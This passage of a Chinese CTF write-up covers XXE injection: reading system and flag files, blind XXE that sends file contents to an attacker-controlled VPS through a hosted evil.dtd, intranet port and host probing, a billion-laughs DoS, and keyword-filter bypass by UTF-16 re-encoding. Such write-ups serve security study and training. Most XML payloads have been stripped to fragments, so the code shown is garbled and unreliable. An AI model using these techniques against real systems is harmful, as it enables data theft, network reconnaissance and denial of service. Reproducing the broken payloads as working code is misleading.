查看一下源码
    function doLogin(){
        var username = $("#username").val();
        var password = $("#password").val();
        if(username == "" || password == ""){
            alert("Please enter the username and password!");
            return;
        }
        var data = "" + username + "" + password + ""; 
        $.ajax({
            type: "POST",
            url: "doLogin.php",
            contentType: "application/xml;charset=utf-8",
            data: data,
            dataType: "xml",
            anysc: false,
            success: function (result) {
                var code = result.getElementsByTagName("code")[0].childNodes[0].nodeValue;
                var msg = result.getElementsByTagName("msg")[0].childNodes[0].nodeValue;
                if(code == "0"){
                    $(".msg").text(msg + " login fail!");
                }else if(code == "1"){
                    $(".msg").text(msg + " login success!");
                }else{
                    $(".msg").text("error:" + msg);
                }
            },
            error: function (XMLHttpRequest,textStatus,errorThrown) {
                $(".msg").text(errorThrown + ':' + textStatus);
            }
这里给出了我们DTD，我们根据DTD进行构造payload即可
     #尝试读取系统配置文件
    ]>
        2&xxe;
        11
成功回显
尝试直接读取flag
    ]>
        2&xxe;
        11
**3.[NCTF 2019]True XML cookbook**
跟上一道题的源码一样，尝试沿用上题的payload发现不能直接获取flag了，尝试利用XXE进行RCE，发现应该是php没有装有expect扩展，无法实现RCE
就感觉有可能是内网探测
利用/proc/net/arp读取到内网的另一台服务器的IP地址172.18.0.1
尝试爆破端口，我爆破到10000多也没有什么信息，
之后查看内网存活主机/etc/hosts
发现有一台存活主机
直接访问发现不行，就利用BP爆破跑内网存活主机，跑出flag
##### **无回显**
也就是我们的blind xxe,一般没有echo,return这些函数，返回不了数值
（需要在自己的VPS上配置上http服务，可以从公网访问我们的dtd文件和xml文件）
**方案一：**
在自己的VPS上创建一个test.php
再创建一个index.php
    %remote;
    %all;
    %send; 
    ]> 
    EOF; 
    $data = simplexml_load_string($xml) ; 
    echo "" ; 
    print_r($data) ; 
    ?>
再创建一个test.xml
    ">
当访问,
存在漏洞的服务器会读出text.txt内容，发送给攻击者服务器上的test.php，然后把读取的数据保存到本地的test.txt中。
**方案二**
可以将文件内容发送到远程服务器，然后读取。
    exp:
    %dtd; %all; 
    ]> 
    &send;
然后在自己的VPS上创建一个evil.xml，内容为
    ">
用来获取用户的配置文件
**方案三**
可以使用外带数据通道提取数据，先使用php://filter获取目标文件的内容，然后将内容以http请求发送到接受数据的服务器(攻击服务器)vps-ip.
    exp:
     # /etc/issue
    %dtd;
    %send;
    ]>
evil.dtd的内容，内部的%号要进行实体编码成&#x25。下面是具体的代码实现
    ”
    >
    %all;
如果有报错的话直接查看VPS的报错信息能得到aaa.php的base64编码后的结果
没有的话可以查看VPS的日志信息，能看到经过base64编码后的数据
**方案四**
其实跟方案四差不多，但是可以利用监听VPS端口来获取信息
方法是在自己的VPS上创建一个evil.dtd
    exp:
     ">
    %dtd;
    %xxe;
之后再根据题目的要求，上传一个payload
    exp：
    %aaa;
    ]>
    66666
之后在自己的VPS上监听3333端口就行
    python -m http.server 3333
    #前提是自己的VPS需要配置好http服务
#### 命令执行
在php环境下，xml命令执行需要php装有`expect`扩展，但该扩展默认没有安装，所以一般来说命令执行是比较难利用，但不排除有幸运的情况咯，这里就搬一下大师傅的代码以供参考：
    ]>
    &f;
    EOF;
    $data = simplexml_load_string($xml);
    print_r($data);
    ?>
#### 探测端口
适用于有回显和blind xxe，是外部一般实体
    exp:
    ]>
    &content;
根据响应时间判断：(看BP右下角的响应时间)
开放端口，响应时间为16millis
未开放端口，延迟反应1047millis
#### 内网存活主机扫描
跟探测端口类似，只不过我们这里是通过文件读取，先查看有没有存活的内网服务器，然后利用BP进行目录遍历爆破IP
    exp:
    ]>
        2&xxe;
        11
    exp:
    ]>
    &admin;123456
#### DOS攻击
    ]>
    &lol9;
XML解析器尝试解析该文件时，由于DTD的定义指数级展开（即递归引用),举个例子，这里定义了一个lol的实体，实体还有“lol”的字符串，然后定义了一个lol2的实体，里面有10个"lol"的字符串，依次递推，一个lol3实体引用10个lol2实体，这样的话可以一直向服务器传输文件，也就是形成了DOS攻击，经过XML解析器解析后的内存占用会比其本身大的多。
#### 10.对于waf以及正则匹配的绕过
##### 编码绕过
对于一些CTF的题目，会对SYSTEM等关键词进行过滤，我们可以利用UTF-16等转码后进行绕过
可以利用linux中的命令iconv
    iconv -f utf8 -t utf16 1.xml>test.xml
    iconv -f #指定待转换文件的编码
    iconv -t #制定目标编码
##### 空格绕过
XML文档有一个特性，在设置标签属性的格式时可以运用多个空格，所以我们可以在XML声明，定义实体的地方利用足够多的空格来进行绕过
    exp:
    %dtd; %all; 
    ]> 
    &send;
### 参考
[XML外部实体注入 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/6754#toc-13)
[一篇文章带你深入理解漏洞之 XXE 漏洞 - 先知社区
(aliyun.com)](https://xz.aliyun.com/t/3357#toc-11)
[十亿笑攻击 - 维基百科
(wikipedia.org)](https://en.wikipedia.org/wiki/Billion_laughs_attack)